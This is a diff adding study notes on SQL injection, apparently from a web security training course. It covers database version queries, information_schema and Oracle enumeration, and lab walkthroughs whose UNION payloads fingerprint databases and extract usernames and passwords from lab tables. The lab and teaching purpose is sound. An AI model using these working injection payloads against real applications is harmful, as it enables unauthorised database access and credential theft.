@@ -282,7 +282,60 @@ The queries to determine the database version for some popular database types ar
 | Oracle           | `SELECT * FROM v$version` |
 | PostgreSQL       | `SELECT version()`        |
 
+For example, you could use a `UNION` attack with the following input:
 
+`' UNION SELECT @@version--`
+
+This might return output like the following, confirming that the database is Microsoft SQL Server, and the version that is being used:
+
+`Microsoft SQL Server 2016 (SP2) (KB4052908) - 13.0.5026.0 (X64)`\
+`Mar 18 2018 09:11:49`\
+`Copyright (c) Microsoft Corporation`\
+`Standard Edition (64-bit) on Windows Server 2016 Standard 10.0 <X64> (Build 14393: ) (Hypervisor)`
+
+### Listing the contents of the database
+
+Most database types (with the notable exception of Oracle) have a set of views called the information schema which provide information about the database.
+
+You can query `information_schema.tables` to list the tables in the database:
+
+`SELECT * FROM information_schema.tables`
+
+This returns output like the following:
+
+`TABLE_CATALOG TABLE_SCHEMA TABLE_NAME TABLE_TYPE`\
+`=====================================================`\
+`MyDatabase dbo Products BASE TABLE`\
+`MyDatabase dbo Users BASE TABLE`\
+`MyDatabase dbo Feedback BASE TABLE`
+
+This output indicates that there are three tables, called `Products`, `Users`, and `Feedback`.
+
+You can then query `information_schema.columns` to list the columns in individual tables:
+
+`SELECT * FROM information_schema.columns WHERE table_name = 'Users'`
+
+This returns output like the following:
+
+`TABLE_CATALOG TABLE_SCHEMA TABLE_NAME COLUMN_NAME DATA_TYPE`\
+`=================================================================`\
+`MyDatabase dbo Users UserId int`\
+`MyDatabase dbo Users Username varchar`\
+`MyDatabase dbo Users Password varchar`
+
+This output shows the columns in the specified table and the data type of each column.
+
+### Equivalent to information schema on Oracle
+
+On Oracle, you can obtain the same information with slightly different queries.
+
+You can list tables by querying `all_tables`:
+
+`SELECT * FROM all_tables`
+
+And you can list columns by querying `all_tab_columns`:
+
+`SELECT * FROM all_tab_columns WHERE table_name = 'USERS'`
 
 ## Blind SQL injection
 
@@ -351,6 +404,50 @@ This table was found to have only two columns: `'+UNION+SELECT+NULL,'a'--`
 We can replace the string portion with our user account query: `'+UNION+SELECT+NULL,username || '~' || password FROM users--`
 
 ### Querying the Database
+
+#### SQL injection attack, querying the database type and version on Oracle
+
+> This lab contains an SQL injection vulnerability in the product category filter. You can use a UNION attack to retrieve the results from an injected query.
+>
+> To solve the lab, display the database version string.
+
+Identifying the `category=` parameter is vulnerable to SQLi I was unable to use UNION to determine the number of columns so I used ORDER BY: `' ORDER BY 2--`
+
+Also check for columns the Oracle has by using `' UNION SELECT NULL,NULL FROM DUAL--`
+
+Lastly, we can get the DB version using: `' UNION SELECT BANNER, NULL FROM v$version--`
+
+#### SQL injection attack, querying the database type and version on MySQL and Microsoft
+
+> This lab contains an SQL injection vulnerability in the product category filter. You can use a UNION attack to retrieve the results from an injected query.
+>
+> To solve the lab, display the database version string.
+
+Identified 2 columns using the following query, also updating the comment character: `' UNION SELECT NULL,NULL-- -` Also determined they are both string column using: `' UNION SELECT 'a','a'-- -` In either case, we can get the version of the DB using: `' UNION SELECT NULL,@@version-- -`
+
+#### SQL injection attack, listing the database contents on non-Oracle databases
+
+> The application has a login function, and the database contains a table that holds usernames and passwords. You need to determine the name of this table and the columns it contains, then retrieve the contents of the table to obtain the username and password of all users.
+
+Determined the amount of columns: `' UNION SELECT NULL,NULL-- -`
+
+Determined the list of table names: `' UNION SELECT table_name ,NULL FROM information_schema.tables-- -`
+
+Retrieved the columns of the table: `' UNION SELECT column_name,NULL FROM information_schema.columns WHERE table_name = 'users_qhgmcj'-- -`
+
+Retrieved the usernames and passwords from the columns: `' UNION SELECT username_oidvtd,password_twatyj FROM users_qhgmcj-- -`
+
+#### SQL injection attack, listing the database contents on Oracle
+
+> The application has a login function, and the database contains a table that holds usernames and passwords. You need to determine the name of this table and the columns it contains, then retrieve the contents of the table to obtain the username and password of all users.
+
+Determined the amount of columns: `' UNION SELECT NULL,NULL FROM DUAL--`
+
+Determined the list of table names: `' UNION SELECT table_name,NULL FROM all_tables--`
+
+Retrieved the columns of the table: `' UNION SELECT column_name,NULL FROM all_tab_columns WHERE table_name = 'USERS_ETKVLE'--`
+
+Retrieved the usernames and passwords from the columns: `'UNION SELECT USERNAME_OSCRET,PASSWORD_DIWNVQ FROM USERS_ETKVLE--`
 
 ### Blind SQL Injection
 
